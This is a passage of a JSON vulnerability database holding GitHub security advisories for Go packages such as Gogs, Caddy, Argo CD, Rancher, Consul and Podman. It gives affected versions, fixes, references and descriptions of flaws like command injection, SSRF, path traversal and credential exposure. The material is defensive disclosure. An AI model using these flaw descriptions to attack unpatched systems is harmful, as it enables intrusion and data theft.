upload](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L128-L129).\n\n### References\n\nhttps://www.huntr.dev/bounties/9cd4e7b7-0979-4e5e-9a1c-388b58dea76b/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #6968.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-958j-443g-7mm7"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/6968"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/6970"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/releases/tag/v0.12.8"}, {"type": "WEB", "url": "https://www.huntr.dev/bounties/9cd4e7b7-0979-4e5e-9a1c-388b58dea76b/"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-06-02T20:50:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2927-hv3p-f3vp", "modified": "2022-06-14T20:01:41Z", "published": "2022-06-03T00:00:29Z", "aliases": ["CVE-2022-29718"], "summary": "Open redirect in caddy", "details": "Caddy v2.4 was discovered to contain an open redirect vulnerability. A remote unauthenticated attacker may exploit this vulnerability to redirect users to arbitrary web URLs by tricking the victim users to click on crafted links.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/caddyserver/caddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/caddyserver/caddy/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29718"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/pull/4499"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/pull/4499/commits/b23bdcf99cfbd09d50555a999a16468404789230"}, {"type": "PACKAGE", "url": "https://github.com/caddyserver/caddy"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/releases/tag/v2.5.0"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CP2VIUT5IKA3OKM6YWA5LTLJ2GTEIH7C/"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-03T22:16:20Z", "nvd_published_at": "2022-06-02T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p782-xgp4-8hr8", "modified": "2023-10-03T10:14:44Z", "published": "2022-06-24T00:00:30Z", "aliases": ["CVE-2022-29526"], "summary": "golang.org/x/sys/unix has Incorrect privilege reporting in syscall", "details": "Go before 1.17.10 and 1.18.x before 1.18.2 has Incorrect Privilege Reporting in syscall. When called with a non-zero flags parameter, the Faccessat function could incorrectly report that a file is accessible.\n\n### Specific Go Packages Affected\ngolang.org/x/sys/unix", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/sys"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220412211240-33da011f77ad"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29526"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/52313"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go.dev/cl/399539"}, {"type": "WEB", "url": "https://go.dev/cl/400074"}, {"type": "WEB", "url": "https://go.dev/issue/52313"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/Y5qrqw_lWdU"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q6GE5EQGE4L2KRVGW4T75QVIYAXCLO5X/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RQXU752ALW53OJAF5MG3WMR5CCZVLWW6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Z55VUVGO7E5PJFXIOVAY373NZRHBNCI5/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZY2SLWOQR4ZURQ7UBRZ7JIX6H6F5JHJR/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0493"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-02"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220729-0001/"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:30:54Z", "nvd_published_at": "2022-06-23T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2m7h-86qq-fp4v", "modified": "2022-06-21T20:03:23Z", "published": "2022-06-21T20:03:23Z", "aliases": ["CVE-2022-31034"], "summary": "Insecure entropy in Argo CD's PKCE/Oauth2/OIDC params", "details": "### Impact\n\nAll versions of Argo CD starting with v0.11.0 are vulnerable to a variety of attacks when an SSO login is initiated from the Argo CD CLI or UI. The vulnerabilities are due to the use of insufficiently random values in parameters in Oauth2/OIDC login flows. In each case, using a relatively-predictable (time-based) seed in a non-cryptographically-secure pseudo-random number generator made the parameter less random than required by the relevant spec or by general best practices. In some cases, using too short a value made the entropy even less sufficient. (The specific weak parameters are listed in the References section.)\n\nThe attacks on login flows which are meant to be mitigated by these parameters are difficult to accomplish but can have a high impact (potentially granting an attacker admin access to Argo CD). The CVSS for this Security Advisory assumes the worst-case scenario.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.1\n* v2.3.5\n* v2.2.10\n* v2.1.16\n\n### Workarounds\n\nThere are no workarounds. You must upgrade to a patched version to resolve the vulnerability.\n\n### References\n\nThese are the insufficiently-random parameters:\n\n1. (since 0.11.0) The [`state` parameter](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1) generated by the `argocd login` command for Oauth2 login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide the entropy [required in the spec](https://datatracker.ietf.org/doc/html/rfc6749#section-10.10). This parameter is a \"recommended\" part of the Oauth2 flow and helps protect against cross-site request forgery attacks.\n2. (since 1.7.2, when PKCE was added) The [`code_verifier` parameter](https://datatracker.ietf.org/doc/html/rfc7636#section-4.1) generated by the `argocd login` command for Oauth2+PKCE login used a non-cryptographically secure source of entropy. The attacks mitigated by PKCE [are complex but have been observed in the wild](https://datatracker.ietf.org/doc/html/rfc7636#section-1).\n3. (since 0.11.0) The [`state` parameter](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1) generated by the Argo CD API server during a UI-initiated Oauth2 login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide the entropy [required in the spec](https://datatracker.ietf.org/doc/html/rfc6749#section-10.10). This parameter is a \"recommended\" part of the Oauth2 flow and helps protect against cross-site request forgery attacks.\n4. (since 0.11.0) The [`nonce` parameter](https://openid.net/specs/openid-connect-core-1_0.html#ImplicitAuthRequest) generated by the Argo CD API server during a UI-initiated Oauth2 implicit flow login used a non-cryptographically secure source of entropy and generated a parameter that was too short to provide sufficient entropy. This parameter is a required part of the OIDC implicit login flow and helps protect against replay attacks.\n\n### Credits\n\nOriginally discovered by @jgwest. @jannfis and @crenshaw-dev re-discovered the vulnerability when reviewing notes from ADA Logics' security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "2.1.16"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.1"}]}], "versions": ["2.4.0"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-2m7h-86qq-fp4v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31034"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/17f7f4f462bdb233e1b9b36f67099f41052d8cb0"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-330", "CWE-331"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-21T20:03:23Z", "nvd_published_at": "2022-06-27T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w689-557m-2cvq", "modified": "2022-06-03T15:35:32Z", "published": "2022-06-03T15:35:32Z", "aliases": ["CVE-2022-1285"], "summary": "Server-Side Request Forgery in gogs webhook", "details": "### Impact\n\nThe malicious user is able to discover services in the internal network through webhook functionality. All installations accepting public traffic are affected.\n\n### Patches\n\nWebhook payload URLs are revalidated before each delivery to make sure they are not resolved to blocked local network addresses. Users should upgrade to 0.12.8 or the latest 0.13.0+dev.\n\n### Workarounds\n\nRun Gogs in its own private network.\n\n### References\n\nhttps://huntr.dev/bounties/da1fbd6e-7a02-458e-9c2e-6d226c47046d/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/6901.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-w689-557m-2cvq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1285"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/7885f454a4946c4bbec1b4f8c603b5eea7429c7f"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/da1fbd6e-7a02-458e-9c2e-6d226c47046d"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-03T15:35:32Z", "nvd_published_at": "2022-06-01T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qpgx-64h2-gc3c", "modified": "2023-08-28T22:32:08Z", "published": "2022-06-17T01:03:47Z", "aliases": ["CVE-2022-25856"], "summary": "Insecure path traversal in Git Trigger Source can lead to arbitrary file read", "details": "### Impact\nA path traversal issue was found in the `(g *GitArtifactReader).Read() API. Read()` calls into `(g *GitArtifactReader).readFromRepository()` that opens and reads the file that contains the trigger resource definition:\n\n```go\nfunc (g *GitArtifactReader) readFromRepository(r *git.Repository, dir string)\n```\n\nNo checks are made on this file at read time, which could lead an attacker to read files anywhere on the system. This could be achieved by either using symbolic links, or putting `../` in the path.\n\n### Patches\nA patch for this vulnerability has been released in the following Argo Events version:\n\nv1.7.1\n\n### Credits\nDisclosed by [Ada Logics](https://adalogics.com/) in a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nOpen an issue in the [Argo Events issue tracker](https://github.com/argoproj/argo-events/issues) or [discussions](https://github.com/argoproj/argo-events/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-events\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-events"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-events/security/advisories/GHSA-qpgx-64h2-gc3c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25856"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/issues/1947"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/pull/1965"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-events/commit/d0f66dbce78bc31923ca057b20fc722aa24ca961"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-events"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0492"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMARGOPROJARGOEVENTSSENSORSARTIFACTS-2864522"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-17T01:03:47Z", "nvd_published_at": "2022-06-17T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wm2r-rp98-8pmh", "modified": "2022-04-27T21:09:13Z", "published": "2022-04-27T21:09:13Z", "aliases": [], "summary": "Exposure of SSH credentials in Rancher/Fleet", "details": "### Impact\nThis vulnerability only affects customers using Fleet for continuous delivery with authenticated Git and/or Helm repositories.\n\nA security vulnerability ([CVE-2022-29810](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29810)) was discovered in `go-getter` library in versions prior to [`v1.5.11`](https://github.com/hashicorp/go-getter/releases/tag/v1.5.11) that exposes SSH private keys in base64 format due to a failure in redacting such information from error messages. The vulnerable version of this library is used in Rancher through Fleet in versions of Fleet prior to [`v0.3.9`](https://github.com/rancher/fleet/releases/tag/v0.3.9). This issue affects Rancher versions 2.5.0 up to and including 2.5.12 and from 2.6.0 up to and including 2.6.3.\n\nWhen Git and/or Helm authentication is configured in [Fleet](https://rancher.com/docs/rancher/v2.6/en/deploy-across-clusters/fleet/) and Fleet is used to deploy a git repo through `Continuous Delivery`, the affected `go-getter` version will expose the configured SSH private key secret if Fleet fails to download the git repo due to a misconfigured URL. The exposed SSH key is logged in base64 format as a query parameter together with the git URL. The credentials can be seen in Rancher UI and in Fleet's deployment pod logs.\n\n### Patches\nPatched versions include releases 2.5.13, 2.6.4 and later versions.\n\n### Workarounds\nThere is not a direct mitigation besides upgrading to the patched Rancher versions. Until you are able to upgrade, limit access in Rancher to trusted users and carefully validate the URLs you are using are correct. Please note that the SSH key might still be compromised in valid URLs if the service goes down or a connection error happens when pulling from the repos.\n\n**Note:** If you believe that SSH keys might have been exposed in your environment, it's highly advised to rotate them.\n\n### Credits\nThis issue was found and reported by Dagan Henderson from Raft Engineering.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-wm2r-rp98-8pmh"}, {"type": "PACKAGE", "url": "github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-04-27T21:09:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q6h7-4qgw-2j9p", "modified": "2022-12-27T00:58:20Z", "published": "2022-04-20T00:00:33Z", "aliases": ["CVE-2022-29153"], "summary": "Hashicorp Consul HTTP health check endpoints returning an HTTP redirect may be abused as SSRF vector", "details": "A vulnerability was identified in Consul and Consul Enterprise (\u201cConsul\u201d) such that HTTP health check endpoints returning an HTTP redirect may be abused as a vector for server-side request forgery (SSRF). This vulnerability, CVE-2022-29153, was fixed in Consul 1.9.17, 1.10.10, and 1.11.5.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29153"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-10-consul-s-http-health-check-may-allow-server-side-request-forgery/"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-10-consul-s-http-health-check-may-allow-server-side-request-forgery/38393"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RBODKZL7HQE5XXS3SA2VIDVL4LAA5RWH/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RBODKZL7HQE5XXS3SA2VIDVL4LAA5RWH/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220602-0005/"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-28T21:13:56Z", "nvd_published_at": "2022-04-19T16:17:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-66vw-v2x9-hw75", "modified": "2022-05-26T19:47:59Z", "published": "2022-04-30T00:00:35Z", "aliases": ["CVE-2022-1227"], "summary": "Podman publishes a malicious image to public registries", "details": "Podman is a tool for managing OCI containers and pods. A privilege escalation flaw was found in Podman. This flaw allows an attacker to publish a malicious image to a public registry. Once this image is downloaded by a potential victim, the vulnerability is triggered after a user runs the 'podman top' command. This action gives the attacker access to the host filesystem, leading to information disclosure or denial of service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containers/psgo"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containers/psgo/internal/proc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1227"}, {"type": "WEB", "url": "https://github.com/containers/podman/issues/10941"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/13862"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/13862/commits/79a3e149c10f74db4cebff624287385c90179d09"}, {"type": "WEB", "url": "https://github.com/containers/psgo/pull/92"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2070368"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DLUJZV3HBP56ADXU6QH2V7RNYUPMVBXQ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0558"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-03T06:15:16Z", "nvd_published_at": "2022-04-29T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gcj7-j438-hjj2", "modified": "2022-04-07T22:10:22Z", "published": "2022-04-07T22:10:22Z", "aliases": ["CVE-2022-24825"], "summary": "Smokescreen SSRF via deny list bypass", "details": "The primary use case for Smokescreen is to prevent server-side request forgery (SSRF) attacks in which external attackers leverage the behavior of applications to connect to or scan internal infrastructure.\n\nSmokescreen also offers an option to deny access to additional (e.g., external) URLs by way of a deny list. There was an issue in Smokescreen that made it possible to bypass the deny list feature by appending a dot to the end of user-supplied URLs, or by providing input in a different letter case.\n\n### Recommendation\nUpgrade Smokescreen to version 0.0.3 or later.\n\n### Acknowledgements\nThanks to [Grzegorz Niedziela](https://twitter.com/gregxsunday) for reporting the issue.\n\n### For more information\nEmail us at security@stripe.com", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/stripe/smokescreen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/stripe/smokescreen/security/advisories/GHSA-gcj7-j438-hjj2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24825"}, {"type": "WEB", "url": "https://github.com/stripe/smokescreen/commit/fafb6ae48c6c40aa011d87b61306abc48db8797b"}, {"type": "PACKAGE", "url": "github.com/stripe/smokescreen"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-07T22:10:22Z", "nvd_published_at": "2022-04-19T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-28r6-jm5h-mrgg", "modified": "2022-04-07T18:13:46Z", "published": "2022-04-06T00:01:30Z", "aliases": ["CVE-2021-30080"], "summary": "Access control bypass in Beego", "details": "An issue was discovered in the route lookup process in beego through 2.0.1, allows attackers to bypass access control.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.12.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-30080"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/4459"}, {"type": "WEB", "url": "https://github.com/beego/beego/commit/d5df5e470d0a8ed291930ae802fd7e6b95226519"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0572"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-07T18:13:46Z", "nvd_published_at": "2022-04-05T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6635-c626-vj4r", "modified": "2022-04-18T21:47:33Z", "published": "2022-04-01T14:05:33Z", "aliases": ["CVE-2022-21235"], "summary": "Command Injection Vulnerability with Mercurial in VCS", "details": "URLs and local file paths passed to the Mercurial (hg) APIs that are specially crafted can contain commands which are executed by Mercurial if it is installed on the host operating system. The `vcs` package uses the underly version control system, in this case `hg`, to implement the needed functionality. When `hg` is executed, argument strings are passed to `hg` in a way that additional flags can be set. The additional flags can be used to perform a command injection. Other version control systems with an implemented interface may also be vulnerable. The issue has been fixed in version 1.13.2. A work around is to sanitize data passed to the `vcs` package APIs to ensure it does not contain commands or unexpected data. This is important for user input data that is passed directly to the package APIs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Masterminds/vcs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Masterminds/vcs/security/advisories/GHSA-6635-c626-vj4r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21235"}, {"type": "WEB", "url": "https://github.com/Masterminds/vcs/pull/105"}, {"type": "WEB", "url": "https://github.com/Masterminds/vcs/commit/922a5122330ea8fbe56352a0172ddb6bf019cd22"}, {"type": "PACKAGE", "url": "https://github.com/Masterminds/vcs"}, {"type": "WEB", "url": "https://github.com/Masterminds/vcs/releases/tag/v1.13.2"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMASTERMINDSVCS-2437078"}], "database_specific": {"cwe_ids": ["CWE-77", "CWE-88"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-04-01T14:05:33Z", "nvd_published_at": "2022-04-01T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xm99-6pv5-q363", "modified": "2023-05-24T17:39:54Z", "published": "2022-04-23T00:03:03Z", "withdrawn": "2023-05-24T17:39:14Z", "aliases": ["CVE-2022-29583"], "summary": "Disputed: OS Command injection in github.com/kardianos/service", "details": "service_windows.go in the kardianos service package for Go omits quoting that is sometimes needed for execution of a Windows service executable from the intended directory.\n\nThe validity of this vulnerability has been [questioned](https://github.com/kardianos/service/pull/290#issuecomment-1109831505) and the reporter has requested that the CVE be [disputed](https://github.com/kardianos/service/issues/289#issuecomment-1110546798).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kardianos/service"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29583"}, {"type": "WEB", "url": "https://github.com/kardianos/service/issues/289"}, {"type": "WEB", "url": "https://github.com/kardianos/service/pull/290"}, {"type": "PACKAGE", "url": "https://github.com/kardianos/service"}], "database_specific": {"cwe_ids": ["CWE-426", "CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-26T13:15:34Z", "nvd_published_at": "2022-04-22T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-32rp-q37p-jg6w", "modified": "2022-04-28T21:12:15Z", "published": "2022-04-20T00:00:30Z", "aliases": ["CVE-2022-1384"], "summary": "Insecure plugin handling in Mattermost", "details": "Mattermost version 6.4.x and earlier fails to properly check the plugin version when a plugin is installed from the Marketplace, which allows an authenticated and an authorized user to install and exploit an old plugin version from the Marketplace which might have known vulnerabilities.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1384"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}, {"type": "PACKAGE", "url": "github.com/mattermost/mattermost-server"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-28T21:12:15Z", "nvd_published_at": "2022-04-19T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fx5p-f64h-93xc", "modified": "2022-04-04T21:23:55Z", "published": "2022-04-04T21:23:55Z", "aliases": [], "summary": " Opened exploitable ports in default docker-compose.yaml in go-ipfs", "details": "### Impact\n\nAllows admin API access to the IPFS node.\n\n### Who 